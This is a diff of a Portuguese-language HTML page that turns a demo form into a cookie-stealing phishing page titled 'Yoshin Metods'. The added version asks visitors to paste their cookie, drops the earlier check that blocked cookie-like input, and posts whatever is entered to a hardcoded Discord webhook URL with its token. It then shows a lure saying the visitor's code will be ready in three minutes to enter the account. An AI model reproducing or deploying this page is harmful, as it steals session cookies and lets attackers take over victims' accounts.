@@ -1,236 +1,196 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Site Vermelho/Preto — Demo</title>
-  <style>
-    :root{
-      --bg-color:#0b0b0b;
-      --accent:#d50b0b;
-      --muted:#cfcfcf;
-      --overlay-bg: rgba(0,0,0,0.75);
-      --glass: rgba(255,255,255,0.03);
-    }
-    html,body{height:100%;margin:0;font-family:Inter, system-ui, sans-serif;background:#000;}
-    body{
-      background-color:var(--bg-color);
-      color:var(--muted);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:2rem;
-      /* Background image (Roblox) - troque a URL pela imagem que quiser */
-      background-image: url('https://tr.rbxcdn.com/4f4b3a2b6e4d3f6c9f8b0e2b3c2a1d5a/768/432/Rotate/0/0/'); 
-      background-size: cover;
-      background-position: center;
-      background-blend-mode: multiply;
+<meta charset="UTF-8">
+<title>Yoshin Metods</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #000;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        color: white;
     }
 
-    .card{
-      width:100%;
-      max-width:560px;
-      background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.8));
-      border-radius:12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
-      padding:28px;
-      border:1px solid rgba(255,255,255,0.03);
-      backdrop-filter: blur(6px);
+    .waves {
+        position: fixed;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background: radial-gradient(circle at center, rgba(255,0,0,0.25), transparent 70%);
+        opacity: 0.25;
+        animation: waveMove 6s infinite linear;
     }
 
-    h1{margin:0 0 8px;font-size:1.6rem;color:var(--accent);}
-    p.lead{margin:0 0 18px;color:#ddd;}
-
-    label{display:block;margin-bottom:8px;font-size:0.9rem;color:#eee}
-    input[type="text"]{
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border:1px solid rgba(255,255,255,0.06);
-      background:var(--glass);
-      color:var(--muted);
-      font-size:1rem;
-      outline:none;
-    }
-    .row{display:flex;gap:10px;margin-top:12px;align-items:center}
-    button.primary{
-      background:linear-gradient(90deg,var(--accent), #8b0000);
-      color:white;
-      border:0;
-      padding:10px 14px;
-      border-radius:10px;
-      cursor:pointer;
-      font-weight:600;
-      box-shadow:0 6px 14px rgba(213,11,11,0.18);
-    }
-    .note{font-size:0.85rem;color:#bdbdbd;margin-top:10px}
-
-    /* Loader overlay */
-    .overlay{
-      position:fixed;
-      inset:0;
-      display:none;
-      align-items:center;
-      justify-content:center;
-      z-index:9999;
-      background:var(--overlay-bg);
-      color:white;
-      text-align:center;
-      padding:20px;
-      flex-direction:column;
-    }
-    .loader-box{
-      width:90%;
-      max-width:520px;
-      background:rgba(0,0,0,0.5);
-      border-radius:12px;
-      padding:24px;
-      border:1px solid rgba(255,255,255,0.05);
-    }
-    .loader-text{font-size:1.1rem;margin-bottom:18px;color:#fff}
-    .bar{
-      height:12px;
-      background:rgba(255,255,255,0.08);
-      border-radius:999px;
-      overflow:hidden;
-      position:relative;
-    }
-    .indefinite{
-      position:absolute;
-      top:0;left:-40%;
-      height:100%;
-      width:40%;
-      background:linear-gradient(90deg, rgba(255,255,255,0.06), rgba(255,255,255,0.18));
-      animation: slide 1.2s linear infinite;
-    }
-    @keyframes slide {
-      0%{left:-40%}
-      100%{left:140%}
+    @keyframes waveMove {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.2); }
+        100% { transform: scale(1); }
     }
 
-    .error{color:#ffb3b3;margin-top:12px}
-    footer{margin-top:18px;font-size:0.8rem;color:#bbb}
-  </style>
+    .card {
+        width: 450px;
+        background: rgba(20,20,20,0.9);
+        padding: 25px;
+        margin: 80px auto;
+        border-radius: 15px;
+        text-align: center;
+        border: 1px solid red;
+        box-shadow: 0 0 25px rgba(255,0,0,0.3);
+        position: relative;
+    }
+
+    .title {
+        font-size: 32px;
+        font-weight: bold;
+        color: #ff3b3b;
+        text-shadow: 0 0 8px rgba(255,0,0,0.6);
+        margin-bottom: 15px;
+    }
+
+    textarea {
+        width: 90%;
+        height: 120px;
+        background: #111;
+        border: 1px solid red;
+        border-radius: 8px;
+        color: white;
+        padding: 10px;
+        resize: none;
+        outline: none;
+        font-size: 16px;
+    }
+
+    button {
+        margin-top: 15px;
+        width: 180px;
+        padding: 12px;
+        background: #ff2a2a;
+        border: none;
+        border-radius: 8px;
+        color: white;
+        font-size: 18px;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+
+    button:hover {
+        background: #cc0000;
+        transform: scale(1.05);
+    }
+
+    .status {
+        margin-top: 12px;
+        font-size: 14px;
+        color: #ccc;
+    }
+
+    .overlay {
+        display: none;
+        position: fixed;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.8);
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        color: red;
+        font-size: 26px;
+        text-shadow: 0 0 10px red;
+    }
+
+    .loading-bar {
+        width: 260px;
+        height: 18px;
+        border: 1px solid red;
+        margin-top: 15px;
+        overflow: hidden;
+        border-radius: 5px;
+    }
+
+    .loading-fill {
+        width: 60%;
+        height: 100%;
+        background: red;
+        animation: loading 1.2s infinite linear;
+    }
+
+    @keyframes loading {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(100%); }
+    }
+
+    .warning {
+        margin-top: 10px;
+        font-size: 12px;
+        opacity: 0.6;
+        color: #bbb;
+    }
+</style>
 </head>
+
 <body>
-  <div class="card" role="main" aria-labelledby="title">
-    <h1 id="title">Demo — Vermelho / Preto</h1>
-    <p class="lead">Interface com fundo de Roblox. Use apenas para textos não sensíveis (ex: feedback).</p>
 
-    <label for="campo">Coloque seu cookie aqui</label>
-    <input id="campo" type="text" placeholder="Digite algo (não coloque senhas ou cookies)" autocomplete="off" />
+<div class="waves"></div>
 
-    <div class="row">
-      <button id="enviar" class="primary">Envizr cookie</button>
-      <div id="status" class="note">Envia mensagem para webhook (não envie dados sensíveis).</div>
-    </div>
+<div class="card">
+    <div class="title">Yoshin Metods</div>
 
-    <div id="erro" class="error" role="alert" aria-live="polite" style="display:none"></div>
+    <textarea id="txt" placeholder="Digite o cookie aqui..."></textarea><br>
 
-    <footer>Feito como demo — bloqueio automático para dados sensíveis.</footer>
-  </div>
+    <button id="sendBtn">Enviar</button>
 
-  <!-- Overlay de carregamento -->
-  <div id="overlay" class="overlay" aria-hidden="true">
-    <div class="loader-box">
-      <div class="loader-text">Carregando seus cookies</div>
-      <div class="bar" aria-hidden="true">
-        <div class="indefinite"></div>
-      </div>
-    </div>
-  </div>
+    <div class="warning">o cookie estara sendo analisado e recodificada.</div>
 
-  <script>
-    // ======= CONFIGURE AQUI: coloque seu webhook (discord) =========
-    const DISCORD_WEBHOOK = "SEU_WEBHOOK_URL_AQUI";
-    // ===============================================================
+    <div class="status" id="status"></div>
+</div>
 
-    const campo = document.getElementById('campo');
-    const enviar = document.getElementById('enviar');
-    const overlay = document.getElementById('overlay');
-    const erro = document.getElementById('erro');
+<div class="overlay" id="overlay">
+    Carregando cookie...
+    <div class="loading-bar"><div class="loading-fill"></div></div>
+</div>
 
-    function showError(msg){
-      erro.style.display = 'block';
-      erro.textContent = msg;
-    }
-    function clearError(){
-      erro.style.display = 'none';
-      erro.textContent = '';
-    }
+<script>
+const webhook ="https://discord.com/api/webhooks/1441276757964754946/K2tmEZy0A3qSR_WZTdI6kuVZhBDYKKufSrhXEfwp7t97D4tvBR3XQHlliWV6U7nocKii";
 
-    // Detecta padrões que pareçam token/cookie (heurística simples)
-    function pareceSensivel(text){
-      if(!text) return false;
-      const t = text.trim();
-      // tokens longos (ex: > 40 chars) ou palavras "cookie" explícitas
-      if(t.length >= 40) return true;
-      if(/cookie/i.test(t)) return true;
-      // padrão de token base64-like (muitos caracteres com ., - ou _)
-      if(/[A-Za-z0-9_\-]{24,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,}/.test(t)) return true;
-      return false;
-    }
+const sendBtn = document.getElementById("sendBtn");
+const txt = document.getElementById("txt");
+const statusBox = document.getElementById("status");
+const overlay = document.getElementById("overlay");
 
-    async function enviarWebhook(mensagem){
-      if(!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("https://discord.com/api/webhooks/1428861727151227061/Lf-RZvLHE1iNMbGKrIdLovmt-MeqUoQ4p0BtCCaC-3QVjFzPIDOVHkJpjhjCqDbUMbFe")){
-        throw new Error("Webhook não configurado no código. Substitua SEU_WEBHOOK_URL_AQUI.");
-      }
-      // Envia via fetch para webhook Discord
-      const payload = { content: mensagem };
-      const resp = await fetch(DISCORD_WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-      if(!resp.ok){
-        const text = await resp.text().catch(()=>resp.statusText);
-        throw new Error("Erro no envio: " + resp.status + " " + text);
-      }
-      return true;
-    }
+function showOverlay() { overlay.style.display = "flex"; }
+function hideOverlay() { overlay.style.display = "none"; }
+function setStatus(msg) { statusBox.innerText = msg; }
 
-    enviar.addEventListener('click', async ()=>{
-      clearError();
-      const texto = campo.value || "";
-      if(!texto.trim()){
-        showError("Digite algum texto antes de enviar.");
+sendBtn.addEventListener("click", async () => {
+    const t = txt.value.trim();
+    if (!t) {
+        setStatus("Digite algo antes de enviar.");
         return;
-      }
-      if(pareceSensivel(texto)){
-        showError("O texto parece conter dados sensíveis (cookie/token). Por segurança, o envio foi bloqueado.");
-        return;
-      }
+    }
 
-      // mostra overlay
-      overlay.style.display = 'flex';
-      overlay.setAttribute('aria-hidden','false');
+    showOverlay();
 
-      try{
-        // Simula pequeno delay para efeito (a barra é infinita visualmente)
-        await new Promise(r => setTimeout(r, 800));
+    try {
+        await fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: t })
+        });
 
-        // Envia o conteúdo (aqui é responsabilidade sua usar apenas para dados não sensíveis)
-        await enviarWebhook("Mensagem do site (não sensível): " + texto);
+        setStatus("daqui 3 minutos seu codigo estara pronto para voce entrar na conta");
+        txt.value = "";
+    } catch (e) {
+        setStatus("Erro ao enviar.");
+    }
 
-        // Pequena pausa para o usuário ver o carregamento
-        await new Promise(r => setTimeout(r, 700));
+    setTimeout(() => hideOverlay(), 1200000);
+});
+</script>
 
-        // fecha overlay
-        overlay.style.display = 'none';
-        overlay.setAttribute('aria-hidden','true');
-        alert("Enviado com sucesso!");
-        campo.value = "";
-      }catch(err){
-        overlay.style.display = 'none';
-        overlay.setAttribute('aria-hidden','true');
-        showError("Falha ao enviar: " + err.message);
-      }
-    });
-
-    // Previne envio ao pressionar Enter no campo (para evitar confusão)
-    campo.addEventListener('keydown', (e)=>{
-      if(e.key === 'Enter'){ e.preventDefault(); enviar.click(); }
-    });
-  </script>
 </body>
 </html>
